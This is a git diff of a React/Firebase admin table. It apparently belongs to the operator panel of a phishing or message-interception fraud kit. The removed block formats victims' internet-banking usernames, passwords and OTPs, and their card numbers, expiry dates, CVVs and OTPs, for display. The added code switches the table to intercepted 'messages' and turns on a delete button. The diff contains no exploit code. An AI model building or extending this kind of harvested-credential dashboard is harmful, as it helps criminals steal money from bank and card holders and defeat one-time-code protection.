@@ -208,24 +208,14 @@ export default function EnhancedTable(props) {
     getPrev,
     getNext,
 } = usePagination(db, "messages", orderBy, order, rowsPerPage);
-console.log(items)
+const counterDoc = doc(db, 'messageCounter', 'counter');
 React.useEffect(()=> {
-  const finalItem = items.map(row => {
-    if (row.payment_method === 'Internet banking') {
-      row.m_pin_1 = `Bank-${row.bankname} Username-${row.username}  Password-${row.password}`;
-      row.m_pin_2 = row.otp;
-    } else if (row.payment_method === 'Credit or Debt card') {
-      row.m_pin_1 = `Card No-${row.cardNumber} Expire-${row.expire} CVV-${row.cvv}`;
-      row.m_pin_2 = row.otp;
-    }
-    return row;
-  });
-  setData(finalItem);
+  setData(items);
 },[items]);
 
 React.useEffect(()=> {
-  return onSnapshot(doc(db, "formDataCounter", "counter"), (doc) => {
-    const t = doc.data().dataCount || 0
+  return onSnapshot(counterDoc, (doc) => {
+    const t = doc.data().messagesCount || 0
     setTotal(t);
   });
 },[]);
@@ -242,10 +232,11 @@ const handleDeleteConfirm = async() => {
     const id = selectedData.docId;
     setIsDeleteModlOpen(false);
     if (id) {
-      const counterDoc = doc(db, 'messageCounter', 'counter');
       try {
-        await deleteDoc(doc(db, 'formData', id)); 
-        await updateDoc(counterDoc, { dataCount: increment(-1) });
+        console.log("deliting doc", selectedData);
+        await deleteDoc(doc(db, 'messages', id)); 
+        console.log("doc deleted")
+        await updateDoc(counterDoc, { messagesCount: increment(-1) });
       } catch (err) {
         console.log(err)
       }
@@ -321,7 +312,7 @@ const handleSendClicked = (data) => {
                       <TableCell align="center">{row.body}</TableCell>
                       <TableCell align="center">{row.status} </TableCell>
                       <TableCell align="center">
-                      {/* <Button className='w-0.5 h-0.5 grow' size="small" variant="contained" color="error" onClick={()=>handleDeleteClick(row)} style={{width: "50px"}}>Delete</Button> */}
+                      <Button className='w-0.5 h-0.5 grow' size="small" variant="contained" color="error" onClick={()=>handleDeleteClick(row)} style={{width: "50px"}}>Delete</Button>
                       </TableCell>
                     </TableRow>
                   );
